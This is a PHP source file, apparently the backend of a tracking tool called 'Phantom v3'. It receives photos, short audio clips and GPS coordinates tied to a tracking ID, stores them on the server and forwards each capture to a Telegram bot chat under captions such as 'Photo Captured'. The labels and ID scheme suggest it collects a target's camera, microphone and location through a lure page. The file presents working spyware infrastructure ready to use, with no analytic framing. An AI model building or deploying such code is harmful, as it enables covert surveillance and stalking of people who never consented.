<?php
/**
 * Phantom v3 – Receive Photo + Audio and send to Telegram
 */

$config = require __DIR__ . '/config.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit;
}

$trackId = isset($_POST['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['id']) : '';
$lat     = $_POST['lat'] ?? '';
$lon     = $_POST['lon'] ?? '';
$acc     = $_POST['accuracy'] ?? '';

if (empty($trackId)) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing ID']);
    exit;
}

$token = $config['telegram']['bot_token'] ?? '';
$chat  = $config['telegram']['chat_id'] ?? '';

// Create photos & audio folders
$photoDir = __DIR__ . '/logs/photos';
$audioDir = __DIR__ . '/logs/audio';
if (!is_dir($photoDir)) mkdir($photoDir, 0755, true);
if (!is_dir($audioDir)) mkdir($audioDir, 0755, true);

$timestamp = time();

// ===== Handle Photo =====
if (!empty($_FILES['photo']) && $_FILES['photo']['error'] === UPLOAD_ERR_OK) {
    $photo = $_FILES['photo'];
    $photoName = $trackId . '_' . $timestamp . '.jpg';
    $photoPath = $photoDir . '/' . $photoName;
    move_uploaded_file($photo['tmp_name'], $photoPath);

    // Send photo to Telegram
    if ($token && $chat) {
        $caption  = "📸 <b>Photo Captured</b>\n";
        $caption .= "ID: <code>{$trackId}</code>\n";
        if ($lat && $lon) {
            $caption .= "📍 {$lat}, {$lon}";
            if ($acc) $caption .= " (±{$acc}m)";
        }

        $url = "https://api.telegram.org/bot{$token}/sendPhoto";
        $post = [
            'chat_id'    => $chat,
            'caption'    => $caption,
            'parse_mode' => 'HTML',
            'photo'      => new CURLFile($photoPath, 'image/jpeg', 'capture.jpg')
        ];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $post,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 15
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

// ===== Handle Audio =====
if (!empty($_FILES['audio']) && $_FILES['audio']['error'] === UPLOAD_ERR_OK) {
    $audio = $_FILES['audio'];
    $audioName = $trackId . '_' . $timestamp . '.webm';
    $audioPath = $audioDir . '/' . $audioName;
    move_uploaded_file($audio['tmp_name'], $audioPath);

    // Send audio to Telegram
    if ($token && $chat) {
        $caption  = "🎤 <b>Short Audio Captured</b>\n";
        $caption .= "ID: <code>{$trackId}</code>\n";
        $caption .= "Duration: ~3.5 seconds";

        $url = "https://api.telegram.org/bot{$token}/sendAudio";
        $post = [
            'chat_id'    => $chat,
            'caption'    => $caption,
            'parse_mode' => 'HTML',
            'audio'      => new CURLFile($audioPath, 'audio/webm', 'capture.webm')
        ];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $post,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 15
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

header('Content-Type: application/json');
echo json_encode(['ok' => true]);
